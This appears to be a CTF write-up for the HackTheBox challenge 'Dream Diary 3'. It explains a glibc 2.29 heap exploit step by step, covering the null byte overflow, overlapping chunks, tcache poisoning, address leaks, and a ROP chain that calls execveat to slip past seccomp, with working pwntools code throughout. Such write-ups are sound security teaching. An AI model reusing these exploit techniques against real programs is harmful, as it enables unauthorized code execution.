---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2020-02-27-f09f9491-dreamdiary3-hackthebox
tags:
- binary exploitation
- glibc 2.29
- heap
- heap exploit
- null byte overflow
- rop
- seccomp
title: Dream Diary 3 @ HackTheBox
---

Dream Diary 3 is a 80 points pwn challenge on hackthebox that involes abusing a null byte overflow on the heap with glibc 2.29. All modern protections are enabled & seccomp is hindering us to call certain systemcalls.

## Setup

The rpath and interpreter values have been tampered with and some values have been overwritten in the provided libc version, which makes it difficult to debug as pwndebug and gefs heap commands won’t work. To work around this issue, I developed the exploit against my local libc (which was also 2.29) and changed offsets later:

```
patchelf --print-rpath diary3
patchelf --print-interpreter diary3
patchelf --set-rpath '/usr/lib/x86_64-linux-gnu/libc.so.6' diary3
patchelf --set-interpreter '/usr/lib/x86_64-linux-gnu/ld-2.29.so' diary3
```

We start the code by writing some wrapper functions for the menu options of the program:

```python
def add(size, data=""):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.sendline(data)


def edit(index, data):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('data: ')
    p.sendline(data)

def show(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(index))


def free(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(index))
```

Currently the heap bins look clean:

```
pwndbg> bins
tcachebins
0x410 [  1]: 0x55ea9413c2a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
```

The next preparation step at this point is to fill up 2 tcache lists of sizes 0xf0 and 0x128:

```
for i in range(7):
  add(0xf0)
for i in range(7):
  free(i)
for i in range(7):
  add(0x128)
for i in range(7):
  free(i)
```

Tcaches are a new single linked list structure in glibc >= 2.26. It creates such a list for every size that is freed and has a capacity of 7. Allocations will be served by the tcache first if one of the required size exists.

Heap bins:

```
pwndbg> bins
tcachebins
0x100 [  7]: 0x558330cbecc0 —▸ 0x558330cbebc0 —▸ 0x558330cbeac0 —▸ 0x558330cbe9c0 —▸ 0x558330cbe8c0 —▸ 0x558330cbe7c0 —▸ 0x558330cbe6c0 ◂— 0x0
0x130 [  7]: 0x558330cbf4e0 —▸ 0x558330cbf3b0 —▸ 0x558330cbf280 —▸ 0x558330cbf150 —▸ 0x558330cbf020 —▸ 0x558330cbeef0 —▸ 0x558330cbedc0 ◂— 0x0
0x410 [  1]: 0x558330cbd2a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
empty
```

We create 3 adjacent chunks: A, B and C.

```
add(0x128, 'A'*0x128)
add(0x118, 'B'*0x118)
add(0x118, (b"C"*0xF8)+p64(0x21)+p64(0)+p64(0)+p64(0))
```

```
0x5609072654d0:    0x0000000000000000  0x0000000000000131
0x5609072654e0:    0x4141414141414141  0x4141414141414141
...
0x5609072655f0:    0x4141414141414141  0x4141414141414141
0x560907265600:    0x4141414141414141  0x0000000000000121
0x560907265610:    0x4242424242424242  0x4242424242424242
...
0x560907265710:    0x4242424242424242  0x4242424242424242
0x560907265720:    0x4242424242424242  0x0000000000000121
0x560907265730:    0x4343434343434343  0x4343434343434343
...
0x560907265810:    0x4343434343434343  0x4343434343434343
0x560907265820:    0x4343434343434343  0x0000000000000021
0x560907265830:    0x0000000000000000  0x0000000000000000
0x560907265840:    0x0000000000000000  0x000000000001e7c1
```

Note: view heap with `heap` command.

The 0x118 sized chunks come from the wilderness, while the 0x128 sized chunk (A) comes from the tcache\[0x130\], which now has only 6 entries left.

Note that C is not just filled with ‘C’ like the other 2 chunks because I already prepared for a later stage (explanation follows).

## Leaking the heap

To bypass one of glibc 2.29 checks later on, we need to leak a heap pointer. To do so, we can use the Tcaches.

```python
free(0)
add(0x128)
show(0)
p.recvuntil (": ") 
leak_addr = u64(p.recvn(6).ljust (8 , b'\x00'))
leak_offset = 0x1D6-0x40 # change this 
fake_header = leak_addr + leak_offset
free(0)
```

We free the A chunk and add a new one. Because the tcache has still room (currently at 6 entries), it will go into the tcache and write the fd pointer to the just freed location.

```
0x55ceeca904d0:    0x0000000000000000  0x0000000000000131
0x55ceeca904e0:    0x000055ceeca9030a  0x0000000000000000
0x55ceeca904f0:    0x4141414141414141  0x4141414141414141
```

The reallocation of A will come from tcache aswell and will give back the exact address that was just freed. This means the fd pointer is now in the data section of A. Because we have not added any data to it on creation, we can read the pointer with *show*. Afterwards we free the A area again to clean up (tcache\[0x130\] now at 7).

# Null byte overflow & overlapping chunks

The basic idea is to overflow a null byte from chunk B into C, resetting the the prev\_inuse bit on Cs header. When we now free A and C, coalescing will kick in, combining all memory from C to A into one big chunk. B was never freed and is still allocated, while simultaneously considered inside the big free chunk.

There are 3 things to pay attention to here:

- The *previous size* value between B and C must be forged, so it points to the start of A
- glibc 2.29 checks on coalescing that the *size* of A is equal to the size of the forged *previous size* value
- A null byte overwrite into Cs size can reduce the size of C considerably and it will be checked that there is a next chunk at the end of C.

Criterion 1 we can achieve by just writing the prev\_size value to the end of B, because its still inside Bs data section.  
Criterion 2 we fulfil by writing fake chunk metadata inside As data section.This fake metadata has our fake size and 2 pointers that point back to this fake chunk itself, requiring the heap leak we already got.  
Criterion 3 we fulfil by writing fake chunk metadata inside Cs data section.

The null byte overwrite in this challenge is achieved by creating chunk and then editing its full size. The terminating null byte will overflow.

Fake header in A (Criterion 2):

```
add(0x128, p64(0)+p64(0x241)+p64(fake_header)+p64(fake_header))
```

```
0x55a2ac8274d0:    0x0000000000000000  0x0000000000000131
0x55a2ac8274e0:    0x0000000000000000  0x0000000000000241
0x55a2ac8274f0:    0x000055a2ac8274a0  0x000055a2ac8274a0
0x55a2ac827500:    0x414141414141410a  0x4141414141414141
```

Null byte overwrite from B into Cs metadata & fake previous size value:

```
for i in range(0x118-2, 0x118-9, -1):
    edit(1, 'B'*i + '\x40\x02')
```

```
0x55a2ac8274d0:    0x0000000000000000  0x0000000000000131
0x55a2ac8274e0:    0x0000000000000000  0x0000000000000241
0x55a2ac8274f0:    0x000055a2ac8274a0  0x000055a2ac8274a0
0x55a2ac827500:    0x414141414141410a  0x4141414141414141
...
0x55a2ac8275f0:    0x4141414141414141  0x4141414141414141
0x55a2ac827600:    0x4141414141414141  0x0000000000000121
0x55a2ac827610:    0x4242424242424242  0x4242424242424242
...
0x55a2ac827710:    0x4242424242424242  0x4242424242424242
0x55a2ac827720:    0x0000000000000240  0x0000000000000100
0x55a2ac827730:    0x4343434343434343  0x4343434343434343
...
0x55a2ac827810:    0x4343434343434343  0x4343434343434343
0x55a2ac827820:    0x4343434343434343  0x0000000000000021
0x55a2ac827830:    0x0000000000000000  0x0000000000000000
0x55a2ac827840:    0x0000000000000000  0x000000000001e7c1
```

Previous size was set to 0x240 and the 0x121 original size was set to 0x100, clearing the prev\_inuse bit and reducing the size of C. Note that we now have fulfilled all of the criterions. There is fake 0x241 sized chunk (2), we set previous size and cleared prev\_inuse (1) and created a another fake header after C because we reduced its size (3).

After coalescing:

```
0x55dec580c4d0:    0x0000000000000000  0x0000000000000131
0x55dec580c4e0:    0x0000000000000000  0x0000000000000341
0x55dec580c4f0:    0x00007f9b7aa87ca0  0x00007f9b7aa87ca0
0x55dec580c500:    0x414141414141410a  0x4141414141414141
...
0x55dec580c5f0:    0x4141414141414141  0x4141414141414141
0x55dec580c600:    0x4141414141414141  0x0000000000000121
0x55dec580c610:    0x4242424242424242  0x4242424242424242
...
0x55dec580c710:    0x4242424242424242  0x4242424242424242
0x55dec580c720:    0x0000000000000240  0x0000000000000100
0x55dec580c730:    0x4343434343434343  0x4343434343434343
...
0x55dec580c810:    0x4343434343434343  0x4343434343434343
0x55dec580c820:    0x0000000000000340  0x0000000000000020
```

Note that the size has changed to 0x341, indicating that B was overlapped and we have one big free chunk. We will now abuse this to leak libc.

## Leaking Libc

As we have an overlapped chunk, we can allocate a new chunk at the location where A originally was. This will shrink the big free chunk, which leads to its main\_arena pointers being pushed down on the heap, into the area where B is still allocated:

```python
add(0x110)
show(1)
p.recvuntil (": ")
main_arena = u64(p.recvn(6).ljust (8 , b'\x00'))
libc_base = main_arena - 0x1E4CA0
libc_environ = libc_base + 0x1E7D60 
free(0)
```

```
0x564822c474d0:    0x0000000000000000  0x0000000000000131
0x564822c474e0:    0x0000000000000000  0x0000000000000121
0x564822c474f0:    0x00007f3653e39f0a  0x00007f3653e39fd0
0x564822c47500:    0x414141414141410a  0x4141414141414141
...
0x564822c47600:    0x4141414141414141  0x0000000000000221
0x564822c47610:    0x00007f3653e39ca0  0x00007f3653e39ca0
0x564822c47620:    0x4242424242424242  0x4242424242424242
```

A show on B then leaks the pointer to main\_arena. To find the exact offset inspect the leak address and subtract the libcbase (via `vmmap`) from it.

# Getting a Write Primitive

To prepare, we clear up tcache\[0x130\] (which has 7 entries at this point). Because tcache\[0x130\] is empty now, the next allocation is served by the unsorted bin (the huge free chunk created by our overlap).

```python
for i in range(7):
    add(0x128)
add(0x128)
```

```
0x5611538f34d0:    0x0000000000000000  0x0000000000000131
0x5611538f34e0:    0x00005611538f330a  0x0000000000000000
0x5611538f34f0:    0x00007f71377d7f0a  0x00007f71377d7fd0
0x5611538f3500:    0x414141414141410a  0x4141414141414141
...
0x5611538f35f0:    0x4141414141414141  0x4141414141414141
0x5611538f3600:    0x4141414141414141  0x0000000000000131
0x5611538f3610:    0x00007f71377d7c0a  0x00007f71377d7ca0
0x5611538f3620:    0x4242424242424242  0x4242424242424242
...
0x5611538f3710:    0x4242424242424242  0x4242424242424242
0x5611538f3720:    0x0000000000000240  0x0000000000000100
0x5611538f3730:    0x4343434343434343  0x00000000000000f1
0x5611538f3740:    0x00007f71377d7ca0  0x00007f71377d7ca0
0x5611538f3750:    0x4343434343434343  0x4343434343434343
...
```

The last allocation we did is exactly on top of B because it comes from the unsorted bin. Remember that in the last step, by leaking libc, we pushed the unsorted bin down – this is the location we got back now.

With this setup, we can now read/write from/to any location.

# Leaking the Stack

The libc given to us has no ""/bin/sh" string so we can not use one\_daget, otherwise we could write to malloc\_hook or free\_hook and get a shell that way.

There is a neat trick to leak the stack address via the *environ* pointer. This is a pointer with a symbol in libc that points at the stack (you can get the offset from libc\_base via (`print(libc.symbols['environ'])`).

We free the last 2 allocated chunks, resulting in 2 tache\[0x130\] entries. Then we edit B (which sits on top of the second just freed chunk) at fd pointer position so it contains a pointer to libc->environ:

```python
free(8)
free(9)
for i in range(8-2, 8-9, -1):
    edit(1, b'B'*i + p64(libc_environ)[:6])
```

```
0x564f9c0a8600:    0x4141414141414141  0x0000000000000131
0x564f9c0a8610:    0x00007f0321d57d60  0x0000560000000000
```

```
0x130 [  2]: 0x564f9c0a8610 —▸ 0x7f0321d57d60 (environ) —▸ 0x7ffdf702c928 ◂— ...
```

Because we edited the fd pointer of B, tache\[0x130\] now links to libc->environ, meaning that the second next allocation will be at environ!

```python
add(0x128, "A"*8)
add(0x128)
show(9)
p.recvuntil (": ") 
stack_leak = u64(p.recvn(6).ljust (8 , b'\x00'))
```

Show will read from the allocation in libc we just created and give us the stack pointer. We want to adjust this pointer a bit. We want to trigger our ropchain by calling exit from the main loop, this means we must write it at location behind the stack canary (which we do not want to touch at all). After getting the (static) offset in gdb via manual stepping we can adjust the leak pointer:

```
rop_loc = stack_leak - 0xf2
```

# Rop & Seccomp

To go ahead with exploiting, we create a ropchain with ropper `ropper --file libc.so.6 --chain execve` and modify it to our needs. However ropper will call execve, which is blocked by seccomp. We can view the seccomp rules with `seccomp-tools dump ./diary3`:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

This means the listed syscalls are blacklisted and can not be called without crashing the process. We can bypass these restrictions by using `execveat`, which has the following signature:

```
 int execveat(int dirfd, const char *pathname,
                    char *const argv[], char *const envp[],
                    int flags);
```

The following ropchain sets the registers accordingly and calls the function:

```python
ropnop = p64(libc_base + 0x000000000003148f)
rop = b""
rop += ropnop
rop += ropnop
rop += p64(libc_base + (0x0000000000030e4d)) # 0x0000000000030e4d: pop r12; ret;
rop += b'//bin/sh'
rop += p64(libc_base + (0x0000000000026a25)) # 0x0000000000026a25: pop r13; ret;
rop += p64(libc_base + (0x00000000001e41a0))
rop += p64(libc_base + (0x00000000000a0da8)) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(libc_base + (0x0000000000030e4d)) # 0x0000000000030e4d: pop r12; ret;
rop += p64(0x0000000000000000)
rop += p64(libc_base + (0x0000000000026a25)) # 0x0000000000026a25: pop r13; ret;
rop += p64(libc_base + (0x00000000001e41a8))
rop += p64(libc_base + (0x00000000000a0da8)) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(libc_base + (0x0000000000026542)) # 0x0000000000026542: pop rdi; ret;
rop += p64(0)
rop += p64(libc_base + (0x0000000000026f9e)) # 0x0000000000026f9e: pop rsi; ret;
rop += p64(libc_base + (0x00000000001e41a0))
rop += p64(libc_base + (0x000000000012bda6)) # 0x000000000012bda6: pop rdx; ret;
rop += p64(0)
rop += p64(libc_base + (0x000000000012bda5))  # pop r10; ret;
rop += p64(0)
rop += p64(libc_base + (0x000000000010b31e))  # pop rcx; ret;
rop += p64(0)
rop += p64(libc_base + (0x0000000000047cf8)) # 0x0000000000047cf8: pop rax; ret;
#rop += p64(0x4000003b)
rop += p64(0x142)
rop += p64(libc_base + (0x00000000000cf6c5)) # 0x00000000000cf6c5: syscall; ret;
```

We use the same technique as before to write the chain to the stack at the specified address:

```python
free(7)
free(8)
for i in range(8-2, 8-9, -1):
    edit(1, b'X'*i + p64(rop_loc)[:6]) 
add(0x128, "A"*8)
add(0x128, rop)
```

This basically finishes the exploit, as on choosing exit the rop chain will be executed.

## Modifying offsets for remote

To get a shell on the remote end, we have to adjust the heap leak by -0x40 and add -0x10 to the fake header in A we used to overlap chunks.

## Reading the Flag

After getting a shell we can use `echo *` to list files and then read the flag with `while IFS= read -r line;do echo "$line";done < filename`

Thanks to will135 for creating this awesome challenge and congrats to @r4j0x00 for getting first blood!

Full Exploit: [Exploit](https://gist.github.com/xct/6ef7955d50901ea2750a512bdc649e9c)